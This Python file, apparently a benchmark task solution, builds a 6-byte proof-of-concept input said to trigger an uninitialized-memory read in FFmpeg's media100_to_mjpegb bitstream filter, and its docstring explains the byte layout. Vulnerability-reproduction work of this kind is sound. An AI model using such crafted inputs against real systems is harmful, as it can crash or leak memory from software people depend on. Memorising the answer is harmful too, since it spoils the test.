import os

class Solution:
  """
  Generates a Proof-of-Concept (PoC) input that triggers an
  Uninitialized Value vulnerability in the bsf/media100_to_mjpegb module.
  """
  def solve(self, src_path: str) -> bytes:
    """
    Generate a PoC that triggers the vulnerability.

    The vulnerability lies in the media100_to_mjpegb bitstream filter, which
    allocates an output buffer but fails to initialize the padding area.
    Subsequent processing can read this uninitialized memory.

    The input format for this filter is a 4-byte big-endian size `n`,
    followed by `n` bytes of Media 100 data. The filter performs a check
    on the last two bytes of the input packet, expecting a JPEG EOI marker
    (0xFFD9). The check looks at indices `n+2` and `n+3` of the input packet.

    To create a minimal PoC, we need to choose the smallest `n` that allows
    this EOI check to pass without reading the size field itself. The size
    field occupies indices 0-3. Therefore, `n+2` must be at least 4, which
    means `n >= 2`.

    By choosing `n=2`, the PoC will consist of:
    1. The size `n=2` as a 4-byte big-endian integer: `b'\\x00\\x00\\x00\\x02'`.
    2. A 2-byte payload that satisfies the EOI check: `b'\\xff\\xd9'`.

    The total PoC length is 6 bytes. This input causes the filter to allocate
    an output buffer of size `n + 134 = 136` bytes. With standard FFmpeg
    buffer padding (e.g., 64 bytes), this leaves a significant portion of the
    allocated buffer uninitialized, triggering the vulnerability.

    Args:
        src_path: Path to the vulnerable source code tarball (unused).

    Returns:
        bytes: The PoC input that should trigger the vulnerability.
    """
    n = 2
    # The payload must be b'\xff\xd9' to pass the End-Of-Image check.
    payload = b'\xff\xd9'
    
    # Construct the PoC: 4-byte size (n) followed by the payload.
    poc = n.to_bytes(4, 'big') + payload
    
    return poc